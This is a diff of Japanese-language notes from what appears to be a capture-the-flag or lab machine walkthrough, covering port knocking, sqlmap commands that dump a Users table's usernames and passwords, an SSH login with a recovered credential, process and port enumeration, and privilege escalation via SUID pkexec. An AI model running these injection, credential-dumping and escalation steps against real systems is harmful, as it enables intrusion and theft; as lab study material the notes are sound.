@@ -7,6 +7,7 @@
 - nmapする
   - 22のみ
 - 適当にsshすると1,2,3でポートノックの情報が出る
+  - とりあえずユーザ名は何でもいいのでsshしてみる
   - `ssh admin@$IP`
   - `knock -v $IP 1 2 3`
   - もう一度nmapすると1337portがopenする
@@ -28,14 +29,23 @@
   - `sqlmap -r login.req --dbs --batch`これで探していく
   - `sqlmap -r login.req -D Webapp --tables --batch`
   - `sqlmap -r login.req -D Webapp -T Users --columns --batch`
-  - `sqlmap -r login.req -D Webapp -T Users -C username,password --dump
+  - `sqlmap -r login.req -D Webapp -T Users -C username,password --dump`
   - ユーザ名とパスワードがわかるが時間がかかるので、下のが答え
-- ssh
+- (他の方法でSQLMap)
+  - これでもできるらしい、試してないけど。<- time blindしてるのか異常に時間がかかる
+  - ~`sqlmap -u http://$IP:1337/978345210/index.php --forms --dbs --batch`~
+-  ssh
   - 一人づつsshできるか試してみる   
   - smeagol:MyPreciousR00t
 - システム内探索ランキングでやってみる
+- `ps aux | grep root`
+  - cron,apache2はだいたい、いつもと同じのが動いている。そしてsqlインジェクションしたぐらいなのでsqlが動いている。
+  - `cat /etc/crontab`を見ても具体的なスクリプトは書いていない。より知りたければpspyを使う
+- `ss -lntp`
+  - 動いているポートを探す。プロセスで動いているのはポートにも大体あるので、ここでも特に珍しいのはない 
 - SUID
   - pkexec
+  - PwnKithは使えないので、pkexec.shを使う
+- root取得後
   - /SECRET/~という謎のがある
-- ps aux | grep root
-  - cron,apache2はだいたい、いつもと同じのが動いている  
+ 
